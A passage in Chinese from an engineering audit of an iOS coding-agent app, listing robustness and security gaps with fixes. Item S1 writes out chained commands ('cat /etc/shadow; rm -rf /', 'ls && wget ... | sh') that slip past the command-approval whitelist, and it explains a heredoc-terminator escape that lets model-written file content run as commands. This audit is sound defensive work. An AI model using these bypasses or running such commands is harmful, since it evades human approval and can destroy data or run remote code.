## 四、工程健壮性缺口清单（独立评估，按严重度排序）

### S1【安全·高】审批白名单可被命令链接绕过 + write_file heredoc 逃逸
- `Approval.needsApproval`（Approval.swift:58-71）对 riskyOnly 策略只检查**命令首 token**：`cat /etc/shadow; rm -rf /`、`ls && wget http://... | sh` 均因 `^cat\b`/`^ls\b` 命中白名单而**免审放行**。riskyPattern 的 `\\|\\s*sh` 只拦管道，拦不住 `;`/`&&`/`$()` 链接。
- `write_file` 构造 heredoc（AgentSession.swift:451-453）：模型提供的 content 中若含单独一行 `QSEOF`，heredoc 提前终止，**余下内容作为命令执行**——审批通过的是"写文件"，实际执行任意命令。
- path 处理把单引号直接删除（`replacingOccurrences(of: "'", with: "")` :448,451）——静默改路径而非安全转义。
- **建议**：白名单改为"整条命令拆 token 后逐段复核"或干脆 riskyOnly 全部过审；write_file 改为 stdin 喂数据（ISHShellExecutor 已有 executeExecutable stdinData 能力，ISHShellExecutor.h:83-88）。

### S2【稳定性·高】后台 governor 未接线 → 退后台必挂起
- 方案 R2 全套已在 ObjC 层实现，但 Swift 无任何调用点；退后台后唯一在跑的是记忆管线，且**无 `beginBackgroundTask` 保护**（RootView.swift:119-123）——系统几秒内挂起 App，Phase1 提取大概率半途夭折（下次启动兜底重跑，但"退后台提炼"基本失效）。长任务（M8 验收②）完全无保障。
- **建议**：scenePhase 切换处接线 begin/endBackgroundCPUGovernor + `UIApplication.beginBackgroundTask` 包裹 MemoryPipeline.kick。这是**低成本高收益**的一步——governor 本体已存在。

### S3【可用性·高】Agent turn 无法取消
- 用户发错消息/agent 跑飞时无任何中断手段：`send()` 直接拒绝（AgentSession.swift:211），UI 无停止按钮，LLM 流无取消传播（DeepSeekAdapter 有 onTermination 但无人触发）。dsh `cancel()` 语义完全缺失。
- 审批等待同样无出口：withCheckedContinuation（:360-363）无超时——若审批卡被会话切换等场景遮蔽，agent 永久挂起（与方案 §3.5 fail-closed 相悖）。

### S4【数据完整性·中高】会话重命名重写 append-only 日志
- `rewriteHeaderTitle`（SessionLog.swift:147-164）读全文件→改首行→整文件回写：违反"原始历史不可变"（方案 §3.2），且与 `append` 的串行队列**互不感知**——agent 正在跑时重命名，读-改-写竞态可丢尾部新增事件。
- 全文件无 fsync（writeLine :114-123）：崩溃丢最近若干**整行**（残行容错只救半行，不救未落盘行）。

### S5【内存/性能·中】无上限增长点
- 工具输出**全量**进 llmHistory（AgentSession.swift:403：日志截 6000 字，但喂模型的 out 不截）——`cat` 大文件可一次灌入数 MB，上下文与内存双爆；UI messages.output 同样不截。
- ConsoleHub 有 128K cap ✅（RootView.swift:24-27）；但终端面板每 250ms 轮询全量字符串替换 SwiftUI Text（:65,113-115,526）——64K 字符级重渲染长存。
- `SessionStore.loadTitle` 每行全量 replay JSONL（SessionStore.swift:41-51），左栏每次 refresh 对每个会话重复解析全部事件。
- `MemoryPipeline.extractedSessions` 存 UserDefaults 无上限（MemoryPipeline.swift:19-22）。

### S6【正确性·中】上下文窗口 8k token 硬编码
- CtxUsage.windowTokens=8_000（ComposerKit.swift:48）与 compact 阈值（AgentSession.swift:91）同为 8k——DeepSeek-chat 实际 64k/128k 窗口。后果：过早 compact 丢上下文、CtxRing 百分比虚高 8-16 倍、"/compact 提示"提前轰炸。应随模型配置。
- 另：compact 重建历史用裸 `Self.systemPrompt`（:506-511），**丢掉 AGENTS.md 与记忆摘要注入**（initialSystemPrompt 含二者）——压缩后的会话"失忆"。

### S7【测试·中】零测试
- 全仓库无任何 unit/UI test target（project.yml 单 target；find 无 *Tests*）。方案 M8 才要求，但 SessionLog 解码/审批判定/MiniTar 解包/SSE 拼接四处是纯逻辑，**现在就可低成本补单测**。

### S8【错误恢复·中】boot/rootfs 无自愈
- boot 失败只显示 `failed: boot rc=N`（RootView.swift:704-707），无重试按钮（须杀 App 重进）；meta.db/data 损坏无检测（isInstalled 只查 meta.db 存在，FirstRun.swift:11-13）；持久 shell 死亡无自动重建（总账已记 ❌）。

### S9【CI/发布·中】版本与产物工程

## 六、结论

- 主干能力（对话→工具→审批→持久执行→记忆→恢复）**真实成立**，总账 ~70% 自用 Beta 的自评基本公允。
- 最大意外发现有三：**①审批白名单绕过与 heredoc 逃逸（安全）**、**②governor 已实现但没插电（一行接线换整个后台能力）**、**③审批/取消的"卡死"路径（无应答挂起 + turn 不可中断）**。三者都不在总账上。
- 建议下一轮优先级：S1 安全修补 → S2 governor 接线（含 beginBackgroundTask）→ S3 取消/审批超时 → S4 日志不可变性修复 → 其余按 M7/M8 排期。
